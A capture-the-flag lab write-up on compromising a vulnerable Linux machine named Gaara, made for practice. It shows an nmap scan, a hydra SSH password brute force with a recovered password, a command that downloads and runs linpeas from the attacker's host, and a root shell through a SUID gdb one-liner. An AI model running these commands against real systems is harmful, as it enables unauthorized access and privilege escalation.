---
tags:
  - linux
  - Easy
---
## Setup

```shell
sudo echo "192.168.196.142 gaara" >> /etc/hosts
```
## Nmap scan

```shell
$ nmap -sV -sC gaara -p- --min-rate=10000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-27 01:53 EDT
Nmap scan report for gaara (192.168.196.142)
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
|_  256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
```

## Enumeration

![](png/gaara_site.png)

No directories were found. Nothing. F@#K1n5 weebo.

Anyway, according to the universal laws of enumeration, you gotta work with what you *have*, it will never go *your way*.

We have a user `gaara`. We don't know its password, but ssh is up and running so we can bruteforce the password.

```shell
$ hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://gaara
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-27 02:00:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://gaara:22/
[22][ssh] host: gaara   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-27 02:01:18
```

And there we have it.

```shell
$ ssh gaara@gaara
The authenticity of host 'gaara (192.168.196.142)' can't be established.
ED25519 key fingerprint is SHA256:XpX1VX2RtX8OaktJHdq89ZkpLlYvr88cebZ0tPZMI0I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'gaara' (ED25519) to the list of known hosts.
gaara@gaara's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ 
```

## Privilege Escalation

```shell
gaara@Gaara:~$ wget http://192.168.45.246:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
<...>
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb  # <--- highlighted
-rwsr-xr-x 1 root root 154K Feb  2  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-sr-x 1 root root 7.3M Dec 24  2018 /usr/bin/gimp-2.10 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)

<...>
╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab
-rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb # <--- highlighted
-rwsr-sr-x 1 root root 7.3M Dec 24  2018 /usr/bin/gimp-2.10 (Unknown SGID binary)
-rwxr-sr-x 1 root ssh 315K Jan 31  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage
-rwxr-sr-x 1 root mail 19K Dec  3  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry
-rwxr-sr-x 1 root tty 15K May  4  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 35K Jan 10  2019 /usr/bin/wall
<...>
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/gaara
/run/lock
/run/user/1001
/run/user/1001/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/local/games # <--- highlighted
/var/tmp
<...>
╔══════════╣ Files inside others home (limit 20)
/var/www/html/iamGaara
/var/www/html/index.html
/var/www/html/Temari
/var/www/html/Cryoserver
/var/www/html/Kazekage
<...>
```

SUID bit is set for gdb.

```shell
gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
root
# 
```

That was way too easy.
